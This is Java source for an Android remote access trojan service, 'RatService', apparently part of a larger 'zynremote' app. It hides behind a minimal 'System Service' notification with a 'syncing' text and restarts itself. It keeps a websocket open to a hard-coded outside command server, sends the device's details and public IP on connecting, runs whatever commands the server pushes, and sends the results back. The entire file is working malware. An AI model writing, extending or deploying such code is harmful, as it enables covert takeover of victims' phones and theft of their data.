package com.zynremote.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;

import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class RatService extends Service {

    private static final String TAG = "RatService";
    private static final String SERVER_URL = "wss://zynrat-production.up.railway.app";
    private static final String CH = "rat_ch";

    private OkHttpClient client;
    private WebSocket ws;
    private boolean running = false;
    private Handler reconnectHandler = new Handler(Looper.getMainLooper());
    private int myId = -1;

    @Override
    public void onCreate() {
        super.onCreate();

        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                CH, "System Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }

        client = new OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .pingInterval(30, TimeUnit.SECONDS)
            .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= 26)
            b = new Notification.Builder(this, CH);
        else
            b = new Notification.Builder(this);

        b.setContentTitle("System Service")
         .setContentText("Синхронизация...")
         .setSmallIcon(android.R.drawable.stat_notify_sync);

        startForeground(1, b.build());

        if (!running) {
            running = true;
            connect();
        }

        return START_STICKY;
    }

    private void connect() {
        try {
            Request req = new Request.Builder().url(SERVER_URL).build();
            ws = client.newWebSocket(req, new WSListener());
        } catch (Throwable t) {
            Log.e(TAG, "connect error", t);
            scheduleReconnect();
        }
    }

    private class WSListener extends WebSocketListener {
        @Override
        public void onOpen(WebSocket webSocket, Response response) {
            Log.i(TAG, "Connected");
            sendHello();
        }

        @Override
        public void onMessage(WebSocket webSocket, String text) {
            try {
                JSONObject obj = new JSONObject(text);
                String type = obj.optString("type");

                if ("welcome".equals(type)) {
                    myId = obj.optInt("id", -1);
                    Log.i(TAG, "My ID: " + myId);
                } else if ("cmd".equals(type)) {
                    String cmd = obj.optString("cmd");
                    handleCommand(cmd);
                } else if ("pong".equals(type)) {
                    Log.i(TAG, "Pong");
                }
            } catch (Throwable t) {
                Log.e(TAG, "parse error", t);
            }
        }

        @Override
        public void onFailure(WebSocket webSocket, Throwable t, Response response) {
            Log.e(TAG, "failed: " + t.getMessage());
            scheduleReconnect();
        }

        @Override
        public void onClosed(WebSocket webSocket, int code, String reason) {
            Log.i(TAG, "closed: " + reason);
            scheduleReconnect();
        }
    }

    private void scheduleReconnect() {
        reconnectHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (running) {
                    Log.i(TAG, "Reconnecting...");
                    connect();
                }
            }
        }, 5000);
    }

    private void sendHello() {
        try {
            String info = DeviceInfo.getInfoJson(RatService.this);
            String ip = DeviceInfo.getPublicIp();
            JSONObject hello = new JSONObject();
            hello.put("type", "hello");
            hello.put("device", info);
            hello.put("ip", ip);
            if (ws != null) ws.send(hello.toString());
        } catch (Throwable t) {
            Log.e(TAG, "hello error", t);
        }
    }

    private void handleCommand(String cmd) {
        Log.i(TAG, "Command: " + cmd);
        try {
            String result = Commands.execute(RatService.this, cmd);
            sendResult(cmd, result);
        } catch (Throwable t) {
            sendResult(cmd, "error: " + t.getMessage());
        }
    }

    private void sendResult(String cmd, String result) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("type", "result");
            obj.put("id", myId);
            obj.put("cmd", cmd);
            obj.put("result", result);
            if (ws != null) ws.send(obj.toString());
        } catch (Throwable t) {
            Log.e(TAG, "sendResult error", t);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        reconnectHandler.removeCallbacksAndMessages(null);
        if (ws != null) {
            ws.close(1000, "stopped");
            ws = null;
        }
        super.onDestroy();
    }
}
